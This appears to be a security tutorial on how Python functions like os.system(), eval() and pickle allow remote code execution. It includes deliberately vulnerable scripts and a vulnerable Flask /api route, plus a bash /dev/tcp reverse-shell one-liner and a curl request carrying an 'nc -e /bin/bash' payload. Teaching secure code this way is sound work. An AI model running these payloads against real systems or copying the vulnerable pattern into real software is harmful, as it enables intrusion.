# Python-Security-Principles
Fundamental concepts and principles on how Python application can be abused to gain remote code execution or be used to perform any type of unattended functionality

Python is an interpreted high-level general-purpose programming language. Python's design philosophy emphasizes code readability with its notable use of significant indentation. A lot of modern web application use python , especially when utilizing API endpoints. It is critical to secure these web application and API endpoints to ensure that the web application behaves as expected

When validating secure code , always examine the code to determine what paramter is used to accept user input , on what route is it mapped to and how the user supplied data gets processed during the web applications execution flow. Never pass input that the user has control over to a paramater that gets wrapped around a dangerous function() that could interact with the underlying OS and execute code.

The following Python fucntions() can be abused to execute code, exfiltrate data, perform unattended functionality or bypass authentication pages

- os.system()
- eval()
- exec()
- input()
- str.format()
- Pickle()
- Jinja2/Tornado 
- PyYaml 

os.system()

Allows the Python script/program to execute shell commands on the underlying OS. Below is a basic example of how this function() can be used.

Basic Script - Accepts user input and saves it in the txt variable and then passes the txt variable to os.system()
```
#!/usr/bin/python

import os

txt = input("Enter Command to Execute?: ")
os.system(txt)
```
Another example of a similiar program that is not properly validated. The below code asks for a name , but passes the input to os.system(). This is a basic example of how the context of the program does not match it's functionality. 
```
#!/usr/bin/python

import os

txt = input("What is your name?: ")
os.system(txt)
```
Explioting the above code. Since the entire input variable is send to os.system(), the attacker can just provide a reverse shell one-liner instead of a valid name
```
What is your name?: bash -i >& /dev/tcp/10.10.10.10/9999 0>&1

//Replace IP
//Replace Port
```
The following code accepts user input from the public and passes it to os.system(), allowing the web application to be vulnerable to code execution

Flask - Micro web framework written that allows the web app to function

/api - Web application route. Location of the paramater that accepts user input

POST - Enforces the paramater to only accept user input via a HTTP POST request

os.system() - Function that enables the web application to interact with the underlying OS

request - Paramater that accepts user input , wrapped around os.system(), allowing code execution

Interacting with the web app
```
curl -X POST http://10.10.10.10:5000/api?request=
```
Vulnerable Web Application
```
#!/usr/bin/python

import os
from flask import Flask, request

app = Flask(__name__)


@app.route("/api", methods=["POST"])
def hackme():
    data = os.system(request.form['request'])
    print(data)
```
Explioting the web app

Payload: nc -e /bin/bash 10.10.5.10 9999 | Can be replaced by any other form of RCE. Ensure to base64 or URL encode the payload

```
curl -x POST -d "request=nc -e /bin/bash 10.10.5.10 9999" http://10.10.10.10:5000/api
```
